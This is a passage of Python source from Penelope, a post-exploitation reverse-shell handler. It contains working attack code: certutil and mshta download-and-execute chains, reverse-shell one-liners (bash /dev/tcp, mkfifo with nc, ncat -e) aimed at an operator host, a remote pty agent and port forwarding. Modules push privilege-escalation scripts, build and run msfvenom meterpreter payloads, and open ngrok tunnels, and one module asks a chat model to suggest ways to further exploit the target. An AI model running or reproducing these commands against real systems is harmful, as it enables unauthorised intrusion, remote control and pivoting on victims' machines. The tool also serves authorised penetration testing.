			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
			with zipfile.ZipFile(tempfile_zip, 'w') as myzip:
				altnames = []
				for item in resolved_items:
					if isinstance(item, tuple):
						filename, data = item
						if randomize_fname:
							filename = Path(filename)
							altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
						else:
							altname = filename
						zip_info = zipfile.ZipInfo(filename=str(altname))
						zip_info.date_time = time.localtime(time.time())[:6]
						myzip.writestr(zip_info, data)
					else:
						altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
						myzip.write(item, arcname=altname)
					altnames.append(altname)

			server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
			urlpath_zip = server.add(tempfile_zip)

			cwd_escaped = self.cwd.replace('\\', '\\\\')
			tmp_escaped = self.tmp.replace('\\', '\\\\')
			temp_remote_file_zip = urlpath_zip.split("/")[-1]

			fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}" && echo DOWNLOAD OK'
			unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{cwd_escaped}\').CopyHere(sh.Namespace(\'{tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()" && echo UNZIP OK'

			with open(tempfile_bat, "w") as f:
				f.write(fetch_cmd + "\n")
				f.write(unzip_cmd)

			urlpath_bat = server.add(tempfile_bat)
			temp_remote_file_bat = urlpath_bat.split("/")[-1]
			server.start()
			response = self.exec(
				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
				force_cmd=True, value=True, timeout=None)
			server.stop()
			if not response:
				logger.error("Upload initialization failed...")
				return []
			if not "DOWNLOAD OK" in response:
				logger.error("Data transfer failed...")
				return []
			if not "UNZIP OK" in response:
				logger.error("Data unpacking failed...")
				return []

		# Present uploads
		uploaded_paths = []
		for item in altnames:
			if self.OS == "Unix":
				uploaded_path = shlex.quote(str(Path(destination) / item))
			elif self.OS == "Windows":
				uploaded_path = f'"{PureWindowsPath(destination, item)}"'
			logger.info(f"{paint('Upload OK').GREEN_white} {paint(uploaded_path).yellow}")
			uploaded_paths.append(uploaded_path)
			print()

		return uploaded_paths

	@agent_only
	def script(self, local_script):

		local_script_folder = self.directory / "scripts"
		prefix = datetime.now().strftime("%Y_%m_%d-%H_%M_%S-")

		try:
			local_script_folder.mkdir(parents=True, exist_ok=True)
		except Exception as e:
			logger.error(e)
			return False

		if re.match(r'(http|ftp)s?://', local_script, re.IGNORECASE):
			try:
				filename, data = url_to_bytes(local_script)
				if not data:
					return False
			except Exception as e:
				logger.error(e)

			local_script = local_script_folder / (prefix + filename)
			with open(local_script, "wb") as input_file:
				input_file.write(data)
		else:
			local_script = Path(normalize_path(local_script))

		output_file_name = local_script_folder / (prefix + "output.txt")

		try:
			input_file = open(local_script, "rb")
			output_file = open(output_file_name, "wb")
			first_line = input_file.readline().strip()
			#input_file.seek(0) # Maybe it is not needed
			if first_line.startswith(b'#!'):
				program = first_line[2:].decode()
			else:
				logger.error("No shebang found")
				return False

			tail_cmd = f'tail -n+0 -f {output_file_name}'
			print(tail_cmd)
			Open(tail_cmd, terminal=True)

			thread = threading.Thread(target=self.exec, args=(program, ), kwargs={
				'stdin_src': input_file,
				'stdout_dst': output_file,
				'stderr_dst': output_file
			})
			thread.start()

		except Exception as e:
			logger.error(e)
			return False

		return output_file_name

	def spawn(self, port=None, host=None):

		if self.OS == "Unix":
			if any([self.listener, port, host]):

				port = port or self._port
				host = host or self._host

				if not next((listener for listener in core.listeners.values() if listener.port == port), None):
					new_listener = TCPListener(host, port)

				if self.bin['bash']:
					cmd = f'printf "(bash >& /dev/tcp/{host}/{port} 0>&1) &"|bash'
				elif self.bin['nc'] and self.bin['sh']:
					cmd = f'printf "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {host} {port} >/tmp/_) &"|sh'
				elif self.bin['sh']:
					ncat_cmd = f'{self.bin["sh"]} -c "{self.bin["setsid"]} {{}} -e {self.bin["sh"]} {host} {port} &"'
					ncat_binary = self.tmp + '/ncat'
					if not self.exec(f"test -f {ncat_binary} || echo x"):
						cmd = ncat_cmd.format(ncat_binary)
					else:
						logger.warning("ncat is not available on the target")
						ncat_binary = self.need_binary(
							"ncat",
							URLS['ncat']
							)
						if ncat_binary:
							cmd = ncat_cmd.format(ncat_binary)
						else:
							logger.error("Spawning shell aborted")
							return False
				else:
					logger.error("No available shell binary is present...")
					return False

				logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
				self.exec(cmd)

				# TODO maybe destroy the new_listener upon getting a shell?
				# if new_listener:
				#	new_listener.stop()
			else:
				host, port = self.socket.getpeername()
				logger.info(f"Attempting to spawn a bind shell from {host}:{port}")
				if not Connect(host, port):
					logger.info("Spawn bind shell failed. I will try getting a reverse shell...")
					return self.spawn(port, self._host)

		elif self.OS == 'Windows':
			logger.warning("Spawn Windows shells is not implemented yet")
			return False

		return True

	@agent_only
	def portfwd(self, _type, lhost, lport, rhost, rport):

		session = self
		control = ControlQueue()
		stop = threading.Event()
		task = [(_type, lhost, lport, rhost, rport), control, stop]

		class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
			def handle(self):

				self.request.setblocking(False)
				stdin_stream = session.new_streamID
				stdout_stream = session.new_streamID
				stderr_stream = session.new_streamID

				if not all([stdin_stream, stdout_stream, stderr_stream]):
					return

				code = rf"""
				import socket
				client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				frlist = [stdin_stream]
				connected = False
				while True:
					readables, _, _ = select(frlist, [], [])

					for readable in readables:
						if readable is stdin_stream:
							data = stdin_stream.read({options.network_buffer_size})
							if not connected:
								client.connect(("{rhost}", {rport}))
								client.setblocking(False)
								frlist.append(client)
								connected = True
							try:
								client.sendall(data)
							except OSError:
								break
							if not data:
								frlist.remove(stdin_stream)
								break
						if readable is client:
							try:
								data = client.recv({options.network_buffer_size})
								stdout_stream.write(data)
								if not data:
									frlist.remove(client) # TEMP
									break
							except OSError:
								frlist.remove(client) # TEMP
								break
					else:
						continue
					break
				#client.shutdown(socket.SHUT_RDWR)
				client.close()
				"""
				session.exec(
					code,
					python=True,
					stdin_stream=stdin_stream,
					stdout_stream=stdout_stream,
					stderr_stream=stderr_stream,
					stdin_src=self.request,
					stdout_dst=self.request,
					agent_control=control
				)
				os.close(stderr_stream._read) #TEMP

		class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
			allow_reuse_address = True
			request_queue_size = 100

			@handle_bind_errors
			def server_bind(self, lhost, lport):
				self.server_address = (lhost, int(lport))
				super().server_bind()

		def server_thread():
			with ThreadedTCPServer(None, ThreadedTCPRequestHandler, bind_and_activate=False) as server:
				if not server.server_bind(lhost, lport):
					return False
				server.server_activate()
				task.append(server)
				logger.info(f"Setup Port Forwarding: {lhost}:{lport} {'->' if _type=='L' else '<-'} {rhost}:{rport}")
				session.tasks['portfwd'].append(task)
				server.serve_forever()
			stop.set()

		portfwd_thread = threading.Thread(target=server_thread)
		task.append(portfwd_thread)
		portfwd_thread.start()

	def maintain(self):
		with core.lock:
			current_num = len(core.hosts[self.name]) if core.hosts else 0
			if 0 < current_num < options.maintain:
				session = core.hosts[self.name][-1]
				logger.warning(paint(
						f" --- Session {session.id} is trying to maintain {options.maintain} "
						f"active shells on {self.name} ---"
					).blue)
				return session.spawn()
		return False

	def kill(self):
		if self not in core.rlist:
			return True

		if menu.sid == self.id:
			menu.set_id(None)

		thread_name = threading.current_thread().name
		logger.debug(f"Thread <{thread_name}> wants to kill session {self.id}")

		if thread_name != 'Core':
			if self.OS:
				if self.host_needs_control_session and\
					not self.spare_control_sessions and\
					self.control_session is self:

					sessions = ', '.join([str(session.id) for session in self.host_needs_control_session])
					logger.warning(f"Cannot kill Session {self.id} as the following sessions depend on it: [{sessions}]")
					return False

				for module in modules().values():
					if module.enabled and module.on_session_end:
						module.run(self)
			else:
				self.id = randint(10**10, 10**11-1)
				core.sessions[self.id] = self

			core.control << f'self.sessions[{self.id}].kill()'
			return

		self.subchannel.control.close()
		self.subchannel.close()

		core.rlist.remove(self)
		if self in core.wlist:
			core.wlist.remove(self)
		try:
			self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0)) # RST
			#self.socket.shutdown(socket.SHUT_RDWR) # FIN
		except OSError:
			pass
		self.socket.close()

		if not self.OS:
			message = f"Invalid shell from {self.ip} 🙄"
			play_sound('failure')
		else:
			message = f"Session [{self.id}] died..."
			core.hosts[self.name].remove(self)
			if not core.hosts[self.name]:
				message += f" We lost {self.name_colored} 💔"
				del core.hosts[self.name]

		if self.id in core.sessions:
			del core.sessions[self.id]
		logger.error(message)

		if hasattr(self, 'logfile'):
			self.logfile.close()

		if self.is_attached:
			self.detach()

		for portfwd in self.tasks['portfwd']:
			info, control, stop, thread, server = portfwd
			logger.warning(f"Stopping Port Forwarding: {info[1]}:{info[2]} {'->' if info[0]=='L' else '<-'} {info[3]}:{info[4]}")
			server.shutdown()
			server.server_close()
			while not stop.is_set(): # TEMP
				control << "stop"
			thread.join()

		if self.OS:
			threading.Thread(target=self.maintain).start()
		return True


class Messenger:
	SHELL = 1
	RESIZE = 2
	EXEC = 3
	STREAM = 4

	STREAM_CODE = '!H'
	STREAM_BYTES = struct.calcsize(STREAM_CODE)

	LEN_CODE = 'H'
	_LEN_CODE = '!' + 'H'
	LEN_BYTES = struct.calcsize(LEN_CODE)

	TYPE_CODE = 'B'
	_TYPE_CODE = '!' + 'B'
	TYPE_BYTES = struct.calcsize(TYPE_CODE)

	HEADER_CODE = '!' + LEN_CODE + TYPE_CODE

	def __init__(self, bufferclass):
		self.len = None
		self.input_buffer = bufferclass()
		self.length_buffer = bufferclass()
		self.message_buffer = bufferclass()

	def message(_type, _data):
		return struct.pack(Messenger.HEADER_CODE, len(_data) + Messenger.TYPE_BYTES, _type) + _data
	message = staticmethod(message)

	def feed(self, data):
		self.input_buffer.write(data)
		self.input_buffer.seek(0)

		while True:
			if not self.len:
				len_need = Messenger.LEN_BYTES - self.length_buffer.tell()
				data = self.input_buffer.read(len_need)
				self.length_buffer.write(data)
				if len(data) != len_need:
					break

				self.len = struct.unpack(Messenger._LEN_CODE, self.length_buffer.getvalue())[0]
				self.length_buffer.seek(0)
				self.length_buffer.truncate()
			else:
				data_need = self.len - self.message_buffer.tell()
				data = self.input_buffer.read(data_need)
				self.message_buffer.write(data)
				if len(data) != data_need:
					break

				self.message_buffer.seek(0)
				_type = struct.unpack(Messenger._TYPE_CODE, self.message_buffer.read(Messenger.TYPE_BYTES))[0]
				_message = self.message_buffer.read()

				self.len = None
				self.message_buffer.seek(0)
				self.message_buffer.truncate()
				yield _type, _message

		self.input_buffer.seek(0)
		self.input_buffer.truncate()

class Stream:
	def __init__(self, _id, _session=None):
		self.id = _id
		self._read, self._write = os.pipe()
		self.writebuf = None
		self.feed_thread = None
		self.session = _session

		if self.session is None:
			self.writefunc = lambda data: respond(self.id + data)
			cloexec(self._write)
			cloexec(self._read)
		else:
			self.writefunc = lambda data: self.session.send(Messenger.message(Messenger.STREAM, self.id + data))

	def __lshift__(self, data):
		if not self.writebuf:
			self.writebuf = queue.Queue()
		self.writebuf.put(data)
		if not self.feed_thread:
			self.feed_thread = threading.Thread(target=self.feed, name="feed stream -> " + repr(self.id))
			self.feed_thread.start()

	def feed(self):
		while True:
			data = self.writebuf.get()
			if not data:
				try:
					os.close(self._write)
				except:
					pass
				break
			try:
				os.write(self._write, data)
			except:
				break

	def fileno(self):
		return self._read

	def write(self, data):
		self.writefunc(data)

	def read(self, n):
		try:
			data = os.read(self._read, n)
		except:
			return "".encode()
		if not data:
			try:
				os.close(self._read)
			except:
				pass
		return data

def agent():
	import os
	import sys
	import pty
	import shlex
	import fcntl
	import struct
	import signal
	import termios
	import threading
	from select import select
	signal.signal(signal.SIGINT, signal.SIG_DFL)
	signal.signal(signal.SIGQUIT, signal.SIG_DFL)

	if sys.version_info[0] == 2:
		import Queue as queue
	else:
		import queue
	try:
		import io
		bufferclass = io.BytesIO
	except:
		import StringIO
		bufferclass = StringIO.StringIO

	SHELL = "{}"
	NET_BUF_SIZE = {}
	{}
	{}

	def respond(_value, _type=Messenger.STREAM):
		wlock.acquire()
		outbuf.seek(0, 2)
		outbuf.write(Messenger.message(_type, _value))
		if not pty.STDOUT_FILENO in wlist:
			wlist.append(pty.STDOUT_FILENO)
			os.write(control_in, "1".encode())
		wlock.release()

	def cloexec(fd):
		try:
			flags = fcntl.fcntl(fd, fcntl.F_GETFD)
			fcntl.fcntl(fd, fcntl.F_SETFD, flags | fcntl.FD_CLOEXEC)
		except:
			pass

	shell_pid, master_fd = pty.fork()
	if shell_pid == pty.CHILD:
		os.execl(SHELL, SHELL, '-i')
	try:
		pty.setraw(pty.STDIN_FILENO)
	except:
		pass

	try:
		streams = dict()
		messenger = Messenger(bufferclass)
		outbuf = bufferclass()
		ttybuf = bufferclass()

		wlock = threading.Lock()
		control_out, control_in = os.pipe()
		cloexec(control_out)
		cloexec(control_in)

		rlist = [control_out, master_fd, pty.STDIN_FILENO]
		wlist = []
		for fd in (master_fd, pty.STDIN_FILENO, pty.STDOUT_FILENO, pty.STDERR_FILENO): # TODO
			flags = fcntl.fcntl(fd, fcntl.F_GETFL)
			fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
			cloexec(fd)

		while True:
			rfds, wfds, _ = select(rlist, wlist, [])

			for readable in rfds:
				if readable is control_out:
					os.read(control_out, 1)

				elif readable is master_fd:
					try:
						data = os.read(master_fd, NET_BUF_SIZE)
					except:
						data = ''.encode()
					respond(data, Messenger.SHELL)
					if not data:
						rlist.remove(master_fd)
						try:
							os.close(master_fd)
						except:
							pass

				elif readable is pty.STDIN_FILENO:
					try:
						data = os.read(pty.STDIN_FILENO, NET_BUF_SIZE)
					except:
						data = None
					if not data:
						rlist.remove(pty.STDIN_FILENO)
						break

					messages = messenger.feed(data)
					for _type, _value in messages:
						if _type == Messenger.SHELL:
							ttybuf.seek(0, 2)
							ttybuf.write(_value)
							if not master_fd in wlist:
								wlist.append(master_fd)

						elif _type == Messenger.RESIZE:
							fcntl.ioctl(master_fd, termios.TIOCSWINSZ, _value)

						elif _type == Messenger.EXEC:
							sb = str(Messenger.STREAM_BYTES)
							header_size = 1 + int(sb) * 3
							__type, stdin_stream_id, stdout_stream_id, stderr_stream_id = struct.unpack(
								'!c' + (sb + 's') * 3,
								_value[:header_size]
							)
							cmd = _value[header_size:]

							if not stdin_stream_id in streams:
								streams[stdin_stream_id] = Stream(stdin_stream_id)
							if not stdout_stream_id in streams:
								streams[stdout_stream_id] = Stream(stdout_stream_id)
							if not stderr_stream_id in streams:
								streams[stderr_stream_id] = Stream(stderr_stream_id)

							stdin_stream = streams[stdin_stream_id]
							stdout_stream = streams[stdout_stream_id]
							stderr_stream = streams[stderr_stream_id]

							rlist.append(stdout_stream)
							rlist.append(stderr_stream)

							if __type == 'S'.encode():
								pid = os.fork()
								if pid == 0:
									os.dup2(stdin_stream._read, 0)
									os.dup2(stdout_stream._write, 1)
									os.dup2(stderr_stream._write, 2)
									os.execl("{}", "sh", "-c", cmd)
									os._exit(1)
								os.close(stdin_stream._read)
								os.close(stdout_stream._write)
								os.close(stderr_stream._write)

							elif __type == 'P'.encode():
								def run(stdin_stream, stdout_stream, stderr_stream):
									try:
										{}
									except:
										stderr_stream << (str(sys.exc_info()[1]) + "\n").encode()
									try:
										os.close(stdin_stream._read)
									except:
										pass

									#if stdin_stream_id in streams:
									#	del streams[stdin_stream_id]
									stdout_stream << "".encode()
									stderr_stream << "".encode()
								threading.Thread(target=run, args=(stdin_stream, stdout_stream, stderr_stream)).start()

						# Incoming streams
						elif _type == Messenger.STREAM:
							stream_id, data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
							if not stream_id in streams:
								streams[stream_id] = Stream(stream_id)
							streams[stream_id] << data

				# Outgoing streams
				else:
					data = readable.read(NET_BUF_SIZE)
					readable.write(data)
					if not data:
						rlist.remove(readable)
						del streams[readable.id]

			else:
				for writable in wfds:

					if writable is pty.STDOUT_FILENO:
						sendbuf = outbuf
						wlock.acquire()

					elif writable is master_fd:
						sendbuf = ttybuf

					try:
						sent = os.write(writable, sendbuf.getvalue())
					except OSError:
						wlist.remove(writable)
						if sendbuf is outbuf:
							wlock.release()
						continue

					sendbuf.seek(sent)
					remaining = sendbuf.read()
					sendbuf.seek(0)
					sendbuf.truncate()
					sendbuf.write(remaining)
					if not remaining:
						wlist.remove(writable)
					if sendbuf is outbuf:
						wlock.release()
				continue
			break
	except:
		_, e, t = sys.exc_info()
		import traceback
		traceback.print_exc()
		traceback.print_stack()
	try:
		os.close(master_fd)
	except:
		pass
	os.waitpid(shell_pid, 0)[1]
	os.kill(os.getppid(), signal.SIGKILL) # TODO


def modules():
	return {module.__name__:module for module in Module.__subclasses__()}


class Module:
	enabled = True
	on_session_start = False
	on_session_end = False
	category = "Misc"


class upload_privesc_scripts(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Upload a set of privilege escalation scripts to the target
		"""
		if session.OS == 'Unix':
			session.upload(URLS['linpeas'])
			session.upload(URLS['lse'])
			session.upload(URLS['deepce'])

		elif session.OS == 'Windows':
			session.upload(URLS['winpeas'])
			session.upload(URLS['powerup'])
			session.upload(URLS['privesccheck'])


class peass_ng(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Run the latest version of PEASS-ng in the background
		"""
		if session.OS == 'Unix':
			parser = ArgumentParser(prog='peass_ng', description="peass-ng module", add_help=False)
			parser.add_argument("-a", "--ai", help="Analyze linpeas results with chatGPT", action="store_true")
			try:
				arguments = parser.parse_args(shlex.split(args))
			except SystemExit:
				return
			if arguments.ai:
				try:
					from openai import OpenAI
					#api_key = input("Please enter your chatGPT API key: ")
					#assert len(api_key) > 10
				except Exception as e:
					logger.error(e)
					return False

			output_file = session.script(URLS['linpeas'])

			if arguments.ai:
				api_key = input("Please enter your chatGPT API key: ")
				assert len(api_key) > 10

				with open(output_file, "r") as file:
					content = file.read()

				client = OpenAI(api_key=api_key)
				stream = client.chat.completions.create(
				    model="gpt-4o-mini",
				    messages=[
					{"role": "system", "content": "You are a helpful assistant helping me to perform penetration test to protect the systems"},
					{
					    "role": "user",
					    "content": f"I am pasting here the results of linpeas. Based on the output, I want you to tell me all possible ways the further exploit this system. I want you to be very specific on your analysis and not write generalities and uneccesary information. I want to focus only on your specific suggestions.\n\n\n {content}"
					}
				    ],
				stream=True
				)

				print('\n═════════════════ chatGPT analysis START ════════════════')
				for chunk in stream:
					if chunk.choices[0].delta.content:
						#print(chunk.choices[0].delta.content, end="", flush=True)
						stdout(chunk.choices[0].delta.content.encode())
				print('\n═════════════════ chatGPT analysis END ════════════════')

		elif session.OS == 'Windows':
			logger.error("This module runs only on Unix shells")
			while True:
				answer = ask(f"Use {paint('upload_privesc_scripts').GREY_white}{paint(' instead? (Y/n): ').yellow}").lower()
				if answer in ('y', ''):
					menu.do_run('upload_privesc_scripts')
					break
				elif answer == 'n':
					break

class lse(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Run the latest version of linux-smart-enumeration in the background
		"""
		if session.OS == 'Unix':
			session.script(URLS['lse'])
		else:
			logger.error("This module runs only on Unix shells")


class linuxexploitsuggester(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Run the latest version of linux-exploit-suggester in the background
		"""
		if session.OS == 'Unix':
			session.script(URLS['les'])
		else:
			logger.error("This module runs only on Unix shells")


class meterpreter(Module):
	def run(session, args):
		"""
		Get a meterpreter shell
		"""
		if session.OS == 'Unix':
			logger.error("This module runs only on Windows shells")
		else:
			payload_path = f"/dev/shm/{rand(10)}.exe"
			host = session._host
			port = 5555
			payload_creation_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
			result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)

			if result.returncode == 0:
				logger.info("Payload created!")
				uploaded_path = session.upload(payload_path)
				if uploaded_path:
					meterpreter_handler_cmd = (
						'msfconsole -x "use exploit/multi/handler; '
						'set payload windows/meterpreter/reverse_tcp; '
						f'set LHOST {host}; set LPORT {port}; run"'
					)
					Open(meterpreter_handler_cmd, terminal=True)
					print(meterpreter_handler_cmd)
					session.exec(uploaded_path[0])
			else:
				logger.error(f"Cannot create meterpreter payload: {result.stderr}")


class ngrok(Module):
	category = "Pivoting"
	def run(session, args):
		"""
		Setup and create a tcp tunnel using ngrok
		"""
		if session.OS == 'Unix':
			if not session.system == 'Linux':
				logger.error(f"This modules runs only on Linux, not on {session.system}.")
				return False
			session.upload(URLS['ngrok_linux'], remote_path=session.tmp)
			result = session.exec(f"tar xf {session.tmp}/ngrok-v3-stable-linux-amd64.tgz -C {session.tmp} >/dev/null", value=True)
			if not result:
				logger.info(f"ngrok successuly extracted on {session.tmp}")
			else:
				logger.error(f"Extraction to {session.tmp} failed:\n{indent(result, ' ' * 4 + '- ')}")
				return False
			token = input("Authtoken: ")
			session.exec(f"./ngrok config add-authtoken {token}")
			logger.info("Provide a TCP port number to be exposed in ngrok cloud:")
			tcp_port = input("tcp_port: ")
			#logger.info("Indicate if a TCP or an HTTP tunnel is required?:")
			#tunnel = input("tunnel: ")
			cmd = f"cd {session.tmp}; ./ngrok tcp {tcp_port} --log=stdout"
			print(cmd)
			#session.exec(cmd)
			tf = f"/tmp/{rand(8)}"
			with open(tf, "w") as f:
				f.write("#!/bin/sh\n")
				f.write(cmd)
			logger.info(f"ngrok session open")
			session.script(tf)
		else:
			logger.error("This module runs only on Unix shells")


class uac(Module):
	category = "Forensics"
	def run(session, args):
		"""
		Acquire forensic data Unix systems using UAC (Unix-like Artifacts Collector) in the background
		"""
		if session.OS == 'Unix':
			if not session.system == 'Linux':
				logger.error(f"This modules runs only on Linux, not on {session.system}.")
				return False
			path = session.upload(URLS['uac_linux'], remote_path=session.tmp)[0]
			result = session.exec(f"tar xf {path} -C {session.tmp} >/dev/null", value=True)
			if not result:
				logger.info(f"UAC successfully extracted on {session.tmp}")
			else:
				logger.error(f"Extraction to {session.tmp} failed:\n{indent(result, ' ' * 4 + '- ')}")
				return False
		#	UAC artifacts or profiles can be set by changing the arguments, e.g.:  /uac -u -a './artifacts/live_response/network*' --output-format tar {session.tmp}
			logger.info(f"root user check is disabled. Data collection may be limited. It will WRITE the output on the remote file system.")
			cmd = f"cd {path.removesuffix('.tar.gz')}; ./uac -u -p ir_triage --output-format tar {session.tmp}"
			#session.exec(cmd)
			tf = f"/tmp/{rand(8)}"
			with open(tf, "w") as f:
				f.write("#!/bin/sh\n")
				f.write(cmd)
			logger.info(f"UAC output will be stored at {session.tmp}/uac-%hostname%-%os%-%timestamp%")
			session.script(tf)
		#	Once completed, transfer the output files to your host
		else:
			logger.error("This module runs only on Unix shells")


class linux_procmemdump(Module):
	category = "Forensics"
	def run(session, args):
		"""
		Dump process memory in the background (requires root)
		"""
		if session.OS == 'Unix':
			if not session.system == 'Linux':
				logger.error(f"This modules runs only on Linux, not on {session.system}.")
				return False
			session.upload(URLS['linux_procmemdump'], remote_path=session.tmp)
			print(session.exec(f"ps -eo pid,cmd", value=True))
			logger.info(f"Please provide the PID of the process to be acquired:")
			PID = input("PID: ")
			session.exec(f"{session.tmp}/linux_procmemdump.sh -p {PID} -s -d {session.tmp}")
			logger.info(f"Strings of the process dump will be stored at {session.tmp}/{PID}/")
		else:
			logger.error("This module runs only on Unix shells")


class FileServer:
	def __init__(self, *items, port=None, host=None, url_prefix=None, quiet=False):
		self.port = port or options.default_fileserver_port
		self.host = host or options.default_interface
		self.host = Interfaces().translate(self.host)
		self.items = items
		self.url_prefix = url_prefix + '/' if url_prefix else ''
		self.quiet = quiet
		self.filemap = {}
		for item in self.items:
			self.add(item)

	def add(self, item):
		if item == '/':
			self.filemap[f'/{self.url_prefix}[root]'] = '/'
			return '/[root]'

		item = os.path.abspath(normalize_path(item))

		if not os.path.exists(item):
			if not self.quiet:
				logger.warning(f"'{item}' does not exist and will be ignored.")
			return None

		if item in self.filemap.values():
			for _urlpath, _item in self.filemap.items():
				if _item == item:
					return _urlpath

		urlpath = f"/{self.url_prefix}{os.path.basename(item)}"
		while urlpath in self.filemap:
			root, ext = os.path.splitext(urlpath)
			urlpath = root + '_' + ext
		self.filemap[urlpath] = item
		return urlpath

	def remove(self, item):
		item = os.path.abspath(normalize_path(item))
		if item in self.filemap:
			del self.filemap[f"/{os.path.basename(item)}"]
		else:
			if not self.quiet:
				logger.warning(f"{item} is not served.")

	@property
	def links(self):
		output = []
		ips = [self.host]

		if self.host == '0.0.0.0':
			ips = [ip for ip in Interfaces().list.values()]

		for ip in ips:
			output.extend(('', '🏠 http://' + str(paint(ip).cyan) + ":" + str(paint(self.port).red) + '/' + self.url_prefix))
			table = Table(joinchar=' → ')
			for urlpath, filepath in self.filemap.items():
				table += (
					paint(f"{'📁' if os.path.isdir(filepath) else '📄'} ").green +
					paint(f"http://{ip}:{self.port}{urlpath}").white_BLUE, filepath
				)
			output.append(str(table))
			output.append("─" * len(output[1]))

		return '\n'.join(output)

	def start(self):
		threading.Thread(target=self._start).start()

	def _start(self):
		filemap, host, port, url_prefix, quiet = self.filemap, self.host, self.port, self.url_prefix, self.quiet

		class CustomTCPServer(socketserver.TCPServer):
			allow_reuse_address = True

			def __init__(self, *args, **kwargs):
				self.client_sockets = []
				super().__init__(*args, **kwargs)

			@handle_bind_errors
			def server_bind(self, host, port):
				self.server_address = (host, int(port))
				super().server_bind()

			def process_request(self, request, client_address):
				self.client_sockets.append(request)
				super().process_request(request, client_address)

			def shutdown(self):
				for sock in self.client_sockets:
					try:
						sock.shutdown(socket.SHUT_RDWR)
						sock.close()
					except:
						pass
				super().shutdown()

		class CustomHandler(SimpleHTTPRequestHandler):
			def do_GET(self):
				try:
					if self.path == '/' + url_prefix:
						response = ''
						for path in filemap.keys():
							response += f'<li><a href="{path}">{path}</a></li>'
						response = response.encode()
						self.send_response(200)
						self.send_header("Content-type", "text/html")
						self.send_header("Content-Length", str(len(response)))
						self.end_headers()

						self.wfile.write(response)
					else:
						super().do_GET()
				except Exception as e:
					logger.error(e)

			def translate_path(self, path):
				path = path.split('?', 1)[0]
				path = path.split('#', 1)[0]
				try:
					path = unquote(path, errors='surrogatepass')
				except UnicodeDecodeError:
					path = unquote(path)
				path = os.path.normpath(path)

				for urlpath, filepath in filemap.items():
					if path == urlpath:
						return filepath
					elif path.startswith(urlpath):
						relpath = path[len(urlpath):].lstrip('/')
						return os.path.join(filepath, relpath)
				return ""

			def log_message(self, format, *args):
				if quiet:
					return None
				message = format % args
				response = message.translate(self._control_char_table).split(' ')
				if not response[0].startswith('"'):
					return
				if response[3][0] == '3':
					color = 'yellow'
				elif response[3][0] in ('4', '5'):
					color = 'red'
				else:
					color = 'green'

				response = getattr(paint(f"{response[0]} {response[1]} {response[3]}\""), color)

				logger.info(
					f"{paint('[').white}{paint(self.log_date_time_string()).magenta}] "
					f"FileServer({host}:{port}) [{paint(self.address_string()).cyan}] {response}"
				)

		with CustomTCPServer((self.host, self.port), CustomHandler, bind_and_activate=False) as self.httpd:
			if not self.httpd.server_bind(self.host, self.port):
				return False
			self.httpd.server_activate()
			self.id = core.new_fileserverID
			core.fileservers[self.id] = self
			if not quiet:
				print(self.links)
			self.httpd.serve_forever()

	def stop(self):
		del core.fileservers[self.id]
		if not self.quiet:
			logger.warning(f"Shutting down Fileserver #{self.id}")
		self.httpd.shutdown()


def WinResize(num, stack):
	if core.attached_session is not None and core.attached_session.type == "PTY":
		core.attached_session.update_pty_size()


def custom_excepthook(*args):
	if len(args) == 1 and hasattr(args[0], 'exc_type'):
		exc_type, exc_value, exc_traceback = args[0].exc_type, args[0].exc_value, args[0].exc_traceback
	elif len(args) == 3:
		exc_type, exc_value, exc_traceback = args
	else:
		return
	print("\n", paint('Oops...').RED, '🐞\n', paint().yellow, '─' * 80, sep='')
	sys.__excepthook__(exc_type, exc_value, exc_traceback)
	print('─' * 80, f"\n{paint('Penelope version:').red} {paint(__version__).green}")
	print(f"{paint('Python version:').red} {paint(sys.version).green}")
	print(f"{paint('System:').red} {paint(platform.version()).green}\n")

def get_glob_size(_glob, block_size):
	from glob import glob
	from math import ceil
	normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
	def size_on_disk(filepath):
		try:
			return ceil(float(os.lstat(filepath).st_size) / block_size) * block_size
		except:
			return 0
	total_size = 0
	for part in shlex.split(_glob):
		for item in glob(normalize_path(part)):
			if os.path.isfile(item):
				total_size += size_on_disk(item)
			elif os.path.isdir(item):
				for root, dirs, files in os.walk(item):
					for file in files:
						filepath = os.path.join(root, file)
						total_size += size_on_disk(filepath)
	return total_size

def url_to_bytes(URL):

	# URLs with special treatment
	URL = re.sub(
		r"https://www.exploit-db.com/exploits/",
		"https://www.exploit-db.com/download/",
		URL
	)

	req = Request(URL, headers={'User-Agent': options.useragent})

	logger.trace(paint(f"Download URL: {URL}").cyan)
	ctx = ssl.create_default_context() if options.verify_ssl_cert else ssl._create_unverified_context()

	while True:
		try:
			response = urlopen(req, context=ctx, timeout=options.short_timeout)
			break
		except (HTTPError, TimeoutError) as e:
			logger.error(e)
		except URLError as e:
